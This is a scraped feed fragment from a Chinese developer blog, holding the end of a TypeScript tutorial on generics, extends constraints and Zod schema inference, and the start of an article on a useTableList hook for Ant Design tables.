keyof T = <span class="hljs-string">'username'</span> | <span class="hljs-string">'age'</span> | <span class="hljs-string">'isAdmin'</span>
    │
    ▼
<span class="hljs-title function_ invoke__">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>) 调用时：
    │
    ├─ K 被推断为 <span class="hljs-string">'age'</span>（因为第一个参数是 <span class="hljs-string">'age'</span>）
    │
    ├─ T[K] = T[<span class="hljs-string">'age'</span>] = number
    │
    └─ 检查 <span class="hljs-number">25</span> 是否符合 number ✅
</code></pre>
<h4 data-id="heading-36">为什么这样设计有效</h4>
<p>关键在于 <strong>泛型 K 是在调用时才确定的</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K])
<span class="hljs-comment">//              ↑ 每次调用都会推断出具体的 K</span>
</code></pre>
<ul>
<li>调用 <code>setField('age', ...)</code> 时，K = 'age'</li>
<li>调用 <code>setField('username', ...)</code> 时，K = 'username'</li>
</ul>
<p>然后 <code>T[K]</code> 会根据 K 的值动态计算出对应的类型，实现了"字段名和值类型的绑定"。</p>
<h3 data-id="heading-37">深入理解：泛型变量与 extends 约束</h3>
<h4 data-id="heading-38">泛型变量的本质</h4>
<p>泛型变量 <code>T</code> 是一个<strong>类型占位符</strong>，它的具体值由调用时传入的参数<strong>反推确定</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T)
<span class="hljs-comment">//              ↑ T 是占位符，调用时才知道具体是什么类型</span>
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 调用时，TS 根据参数反推 T 的值</span>
<span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> })
<span class="hljs-comment">//      └─ 参数类型是 { username: string; age: number }</span>
<span class="hljs-comment">//         所以 T = { username: string; age: number }</span>
</code></pre>
<h4 data-id="heading-39"><code>extends</code> 约束的作用</h4>
<p><code>T extends Record&lt;string, unknown&gt;</code> 的意思是：<strong>T 可以是任何类型，但必须满足 <code>Record&lt;string, unknown&gt;</code> 的约束</strong>。</p>
<p><code>Record&lt;string, unknown&gt;</code> 表示"key 是 string，value 是任意类型的对象"，本质上就是普通对象。</p>
<h4 data-id="heading-40">如果传入不符合约束的类型会怎样？</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ✅ 符合约束：普通对象</span>
<span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-comment">// ❌ 不符合约束：数组不是 Record&lt;string, unknown&gt;</span>
<span class="hljs-title function_">useForm</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
<span class="hljs-comment">// 编译错误：Argument of type 'number[]' is not assignable to parameter of type 'Record&lt;string, unknown&gt;'</span>

<span class="hljs-comment">// ❌ 不符合约束：原始类型</span>
<span class="hljs-title function_">useForm</span>(<span class="hljs-string">'hello'</span>);
<span class="hljs-comment">// 编译错误：Argument of type 'string' is not assignable to parameter of type 'Record&lt;string, unknown&gt;'</span>

<span class="hljs-comment">// ❌ 不符合约束：null</span>
<span class="hljs-title function_">useForm</span>(<span class="hljs-literal">null</span>);
<span class="hljs-comment">// 编译错误</span>
</code></pre>
<h4 data-id="heading-41">extends 约束 vs 直接指定类型</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 方式一：直接指定参数类型（不灵活）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">useForm</span>(<span class="hljs-params">initialValues: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>)

<span class="hljs-comment">// 方式二：泛型 + extends 约束（灵活且安全）</span>
<span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T)
</code></pre>
<p><strong>方式一的问题：类型信息丢失</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 直接指定类型的实现</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">useFormBad</span>(<span class="hljs-params">initialValues: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>) {
  <span class="hljs-keyword">const</span> [values, setValues] = <span class="hljs-title function_">useState</span>(initialValues);
  <span class="hljs-keyword">return</span> { values };
}

<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormBad</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-comment">// values 的类型是 Record&lt;string, unknown&gt;</span>
<span class="hljs-comment">// TS 只知道它是"某个对象"，不知道具体有哪些字段</span>

values.<span class="hljs-property">username</span>;  <span class="hljs-comment">// 类型是 unknown，不是 string</span>
values.<span class="hljs-property">age</span>;       <span class="hljs-comment">// 类型是 unknown，不是 number</span>
values.<span class="hljs-property">foo</span>;       <span class="hljs-comment">// ✅ 不报错！TS 认为任何 string key 都可能存在</span>

<span class="hljs-comment">// 使用时必须手动断言，很麻烦且不安全</span>
<span class="hljs-keyword">const</span> name = values.<span class="hljs-property">username</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>;
</code></pre>
<p><strong>方式二的优势：保留具体类型</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 泛型 + extends 约束的实现</span>
<span class="hljs-keyword">function</span> useFormGood&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T) {
  <span class="hljs-keyword">const</span> [values, setValues] = useState&lt;T&gt;(initialValues);
  <span class="hljs-keyword">return</span> { values };
}

<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormGood</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-comment">// values 的类型是 { username: string; age: number }</span>
<span class="hljs-comment">// TS 知道具体有哪些字段，每个字段是什么类型</span>

values.<span class="hljs-property">username</span>;  <span class="hljs-comment">// 类型是 string ✅</span>
values.<span class="hljs-property">age</span>;       <span class="hljs-comment">// 类型是 number ✅</span>
values.<span class="hljs-property">foo</span>;       <span class="hljs-comment">// ❌ 编译错误：Property 'foo' does not exist</span>
</code></pre>
<p><strong>对比总结</strong></p>



































<table><thead><tr><th/><th>直接指定类型</th><th>泛型 + extends</th></tr></thead><tbody><tr><td>参数类型</td><td><code>Record&lt;string, unknown&gt;</code></td><td><code>T</code>（具体类型）</td></tr><tr><td>返回值类型</td><td><code>Record&lt;string, unknown&gt;</code></td><td><code>T</code>（具体类型）</td></tr><tr><td>字段访问</td><td>任意字段都不报错</td><td>只能访问存在的字段</td></tr><tr><td>字段类型</td><td>全是 <code>unknown</code></td><td>保留原始类型</td></tr><tr><td>IDE 提示</td><td>无</td><td>有完整的字段补全</td></tr></tbody></table>
<p>泛型的核心价值就是：<strong>让类型信息在函数调用过程中"流动"，而不是被抹掉</strong>。</p>
<h4 data-id="heading-42">深入理解"类型流动"</h4>
<p><strong>什么是类型被"抹掉"？</strong></p>
<p>当你用宽泛的类型（如 <code>Record&lt;string, unknown&gt;</code>、<code>any</code>、<code>object</code>）作为参数类型时，TS 只能记住这个宽泛的类型，具体的类型信息就丢失了：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">identity</span>(<span class="hljs-params">value: <span class="hljs-built_in">object</span></span>): <span class="hljs-built_in">object</span> {
  <span class="hljs-keyword">return</span> value;
}

<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">identity</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'john'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> });
<span class="hljs-comment">// user 的类型是 object</span>
<span class="hljs-comment">// TS 已经"忘记"了它原本是 { name: string; age: number }</span>
</code></pre>
<p>类型信息在进入函数时被"抹掉"了，出来后就只剩下 <code>object</code>。</p>
<p><strong>什么是类型"流动"？</strong></p>
<p>泛型让 TS 把具体类型"带着走"，从输入流动到输出：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> identity&lt;T&gt;(<span class="hljs-attr">value</span>: T): T {
  <span class="hljs-keyword">return</span> value;
}

<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">identity</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'john'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> });
<span class="hljs-comment">// user 的类型是 { name: string; age: number }</span>
<span class="hljs-comment">// TS "记住"了具体类型，并让它流动到返回值</span>
</code></pre>
<p><strong>流动过程可视化</strong></p>
<pre><code class="hljs language-css" lang="css">没有泛型（类型被抹掉）：
{ name: string; age: number } ──进入函数──► <span class="hljs-selector-tag">object</span> ──返回──► <span class="hljs-selector-tag">object</span>
                                    ↑
                              类型信息在这里丢失

有泛型（类型流动）：
{ name: string; age: number } ──进入函数──► T ──返回──► { name: string; age: number }
                                    ↑              ↑
                              T 记住了具体类型    原样流出
</code></pre>
<p><strong>在 useForm 中的体现</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 类型流动的完整链路：</span>
<span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> })
    │
    ▼ 输入类型 { <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> }
    │
    ▼ T 捕获这个类型
    │
    ▼ useState&lt;T&gt; 使用这个类型
    │
    ▼ setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt; 使用这个类型
    │
    ▼ 返回的 values 保持这个类型
    │
    ▼ 调用方拿到的 values 类型是 { <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> }
</code></pre>
<p>整个过程中，<code>{ username: string; age: number }</code> 这个具体类型被 <code>T</code> 捕获后，一路流动到最终的返回值，没有任何地方丢失。</p>
<p><strong>为什么"流动"很重要？</strong></p>
<p>因为类型的价值在于<strong>使用时</strong>。如果类型在函数调用后丢失了，后续代码就无法获得类型检查和 IDE 提示：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 类型丢失后，后续代码"裸奔"</span>
<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormBad</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });
values.<span class="hljs-property">usernam</span> = <span class="hljs-string">'test'</span>;  <span class="hljs-comment">// 拼写错误，不报错</span>
values.<span class="hljs-property">age</span> = <span class="hljs-string">'25'</span>;        <span class="hljs-comment">// 类型错误，不报错</span>

<span class="hljs-comment">// 类型流动后，后续代码受保护</span>
<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormGood</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });
values.<span class="hljs-property">usernam</span> = <span class="hljs-string">'test'</span>;  <span class="hljs-comment">// ❌ 编译错误：属性不存在</span>
values.<span class="hljs-property">age</span> = <span class="hljs-string">'25'</span>;        <span class="hljs-comment">// ❌ 编译错误：类型不匹配</span>
</code></pre>
<p><strong>一句话总结</strong>：泛型就像一个"类型变量"，它在函数入口捕获具体类型，然后把这个类型带到函数内部和出口，让整个调用链路都能享受到类型安全。</p>
<h4 data-id="heading-43">约束的意义</h4>
<p><code>extends</code> 约束有两个作用：</p>
<ol>
<li><strong>限制调用者</strong>：只能传入符合约束的类型，传错了编译报错</li>
<li><strong>保障实现者</strong>：函数内部可以安全地假设 T 是对象类型，使用 <code>keyof T</code> 等操作</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T) {
  <span class="hljs-comment">// 因为 T extends Record&lt;string, unknown&gt;</span>
  <span class="hljs-comment">// 所以 keyof T 一定是 string（对象的 key）</span>
  <span class="hljs-comment">// 这里的操作是类型安全的</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">keys</span>: (keyof T)[] = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(initialValues) <span class="hljs-keyword">as</span> (keyof T)[];
}
</code></pre>
<h4 data-id="heading-44">总结</h4>

























<table><thead><tr><th>概念</th><th>说明</th></tr></thead><tbody><tr><td>泛型变量 <code>T</code></td><td>类型占位符，调用时由参数反推确定</td></tr><tr><td><code>extends</code> 约束</td><td>限制 T 必须满足某种结构，否则编译报错</td></tr><tr><td>反推机制</td><td>TS 根据实际传入的参数，自动推断出 T 的具体类型</td></tr><tr><td>约束 + 反推</td><td>既保证类型安全（约束），又保留具体类型信息（反推）</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-45">六、VSCode 如何获得类型提示</h2>
<h3 data-id="heading-46">核心：TypeScript Language Server</h3>
<pre><code class="hljs language-arduino" lang="arduino">你写代码 → VSCode → TypeScript Language <span class="hljs-built_in">Server</span> → 类型推导引擎
                              ↓
                    返回类型信息、错误、补全建议
                              ↓
                    VSCode 显示提示/报错/补全
</code></pre>
<h3 data-id="heading-47">工作机制</h3>
<ol>
<li>VSCode 内置 TS 扩展，启动时自动运行 <code>tsserver</code></li>
<li>每次敲键盘，VSCode 通过 LSP 协议把代码发给 tsserver</li>
<li>tsserver 实时分析：解析 AST → 运行类型推导 → 返回结果</li>
<li>VSCode 渲染：红色波浪线、悬浮提示、自动补全列表</li>
</ol>
<h3 data-id="heading-48">功能对应</h3>

























<table><thead><tr><th>功能</th><th>背后在做什么</th></tr></thead><tbody><tr><td>悬浮显示类型</td><td>tsserver 推导出类型返回给 VSCode</td></tr><tr><td>自动补全</td><td>tsserver 返回当前上下文可用的属性/方法</td></tr><tr><td>红色波浪线</td><td>tsserver 检测到类型错误</td></tr><tr><td>F12 跳转定义</td><td>tsserver 找到符号定义位置</td></tr></tbody></table>
<p>类型推导的"智能"全在 TypeScript 编译器里，VSCode 只是显示层。</p>
<hr/>
<h2 data-id="heading-49">总结</h2>





































<table><thead><tr><th>概念</th><th>作用</th></tr></thead><tbody><tr><td>TypeScript 类型</td><td>编译时检查你写的代码</td></tr><tr><td>Zod</td><td>运行时验证外部数据 + Schema 自动导出类型</td></tr><tr><td><code>z.infer</code></td><td>Schema 和类型统一，Single Source of Truth</td></tr><tr><td>泛型</td><td>让类型可复用，让类型信息"流动"</td></tr><tr><td>条件类型</td><td>根据条件返回不同类型</td></tr><tr><td><code>infer</code></td><td>从复杂类型中提取部分</td></tr><tr><td>LSP</td><td>编辑器获得类型提示的桥梁</td></tr></tbody></table>
<h3 data-id="heading-50">核心理念</h3>
<p><strong>TypeScript 类型推断</strong>：把运行时错误变成编译时错误。通过泛型、条件类型等机制，让类型信息在代码中"流动"，在编译阶段就能发现字段拼写错误、类型不匹配等问题。</p>
<p>以 <code>setField</code> 为例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ❌ 没有类型推断的写法</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">setFieldBad</span>(<span class="hljs-params">field: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">unknown</span></span>) {
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-title function_">setFieldBad</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);  <span class="hljs-comment">// 拼写错误，编译不报错，运行时字段没更新</span>
<span class="hljs-title function_">setFieldBad</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);         <span class="hljs-comment">// 类型错误，编译不报错，运行时逻辑出问题</span>

<span class="hljs-comment">// ✅ 有类型推断的写法</span>
<span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K]) {
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-keyword">const</span> { setField } = <span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);  <span class="hljs-comment">// ❌ 编译错误：'usernmae' 不在 'username' | 'age' 中</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);         <span class="hljs-comment">// ❌ 编译错误：类型 'string' 不能赋值给类型 'number'</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>);           <span class="hljs-comment">// ✅ 编译通过</span>
</code></pre>
<p>关键在于 <code>K extends keyof T</code> 和 <code>T[K]</code> 的配合：</p>
<ul>
<li>TS 根据你传入的初始值，推断出 <code>T = { username: string; age: number }</code></li>
<li>调用 <code>setField('age', ...)</code> 时，推断出 <code>K = 'age'</code>，进而推断出 <code>value</code> 必须是 <code>number</code></li>
<li>字段名和值类型的对应关系，在编译时就被锁死了</li>
</ul>
<p>这就是类型推断的威力：<strong>不是简单的类型标注，而是让 TS 根据上下文自动推导出约束关系，把本该运行时才暴露的 bug 提前到编译时拦截</strong>。</p>
<p><strong>Zod 的核心价值</strong>：Schema 即类型（Single Source of Truth）。</p>
<ul>
<li>传统方式：手写 interface + 手写验证逻辑，两份代码容易不同步</li>
<li>Zod 方式：只写一次 Schema，通过 <code>z.infer</code> 自动导出 TypeScript 类型</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 一处定义，两处受益</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({ <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>(), <span class="hljs-attr">age</span>: z.<span class="hljs-title function_">number</span>() });
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = z.<span class="hljs-property">infer</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">UserSchema</span>&gt;;  <span class="hljs-comment">// 编译时类型</span>
<span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(data);                   <span class="hljs-comment">// 运行时验证</span>
</code></pre>
<p><strong>两者的关系</strong>：</p>
<ul>
<li>TypeScript 保证<strong>你写的代码</strong>类型正确（编译时）</li>
<li>Zod 保证<strong>外部数据</strong>符合预期（运行时）</li>
<li><code>z.infer</code> 让 Zod Schema 和 TS 类型统一，避免重复定义</li>
</ul>
<p>两者互补，覆盖了编译时和运行时的类型安全。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 从重复 CRUD 到工程化封装：我是如何设计 useTableList 统一列表逻辑的]]></title>    <link>https://juejin.cn/post/7592815497847488575</link>    <guid>https://juejin.cn/post/7592815497847488575</guid>    <pubDate>2026-01-08T09:29:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497847488575" data-draft-id="7592815497847472191" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 从重复 CRUD 到工程化封装：我是如何设计 useTableList 统一列表逻辑的"/> <meta itemprop="keywords" content="React.js,Ant Design,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T09:29:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="basestone"/> <meta itemprop="url" content="https://juejin.cn/user/2647279728853518"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 从重复 CRUD 到工程化封装：我是如何设计 useTableList 统一列表逻辑的
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2647279728853518/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    basestone
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:29:41.000Z" title="Thu Jan 08 2026 09:29:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    15
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在中后台项目中，最常见的页面不是表单，而是列表页。<br/>
真正消耗时间的，往往不是业务复杂度，而是分页、排序、loading、查询参数同步这些重复劳动。</p>
<p>这篇文章分享我在项目中封装的一个 Hook —— <strong>useTableList</strong>，用于统一管理 Ant Design Table 的列表行为。</p>
<hr/>
<h2 data-id="heading-0">一、为什么要封装表格 Hook？</h2>
<p>在没有封装之前，一个列表页通常要处理：</p>
<ul>
<li>loading 状态</li>
<li>分页 / 页码同步</li>
<li>查询参数合并</li>
<li>表格排序映射</li>
<li>rowSelection 管理</li>
<li>search / refresh / reset 行为区分</li>
</ul>
<p>结果就是：</p>
<p>👉 每个列表页几乎都在复制粘贴，而且 bug 特别容易集中在这些地方。</p>
<p>所以我给自己定了一个目标：</p>
<blockquote>
<p>列表页只关心：表单 + columns + 业务操作<br/>
其余全部交给 Hook。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、设计目标</h2>
<ul>
<li>✅ 数据请求收敛到一个入口</li>
<li>✅ 表格行为（分页 / 排序）内聚</li>
<li>✅ 对外暴露语义清晰的 API</li>
<li>✅ 最大限度贴合 antd Table</li>
<li>✅ 可作为项目级基础设施</li>
</ul>
<hr/>
<h2 data-id="heading-2">三、对外 API 设计</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> {
  queryParams,
  search,
  refresh,
  reset,
  selectedRowKeys,
  tableProps
} = <span class="hljs-title function_">useTableList</span>(getListApi, { <span class="hljs-attr">rowSelection</span>: <span class="hljs-literal">true</span> })
</code></pre>
<h3 data-id="heading-3">search —— 查询（回到第一页）</h3>
<p>用于表单搜索 / 条件变化。</p>
<h3 data-id="heading-4">refresh —— 刷新当前页</h3>
<p>用于新增 / 删除 / 修改之后。</p>
<h3 data-id="heading-5">reset —— 重置条件</h3>
<p>用于重置按钮。</p>
<h3 data-id="heading-6">selectedRowKeys —— 批量操作能力基础</h3>
<h3 data-id="heading-7">tableProps —— 直接传给 antd Table</h3>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Table</span> rowKey=<span class="hljs-string">"id"</span> columns={columns} {...tableProps} /&gt;
</code></pre>
<hr/>
<h2 data-id="heading-8">四、全局配置能力</h2>
<p>解决不同后端字段不统一的问题：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title function_">configureTableOption</span>({
  <span class="hljs-attr">pageSize</span>: <span class="hljs-number">20</span>,
  <span class="hljs-attr">sortField</span>: [<span class="hljs-string">'orderType'</span>, <span class="hljs-string">'orderField'</span>],
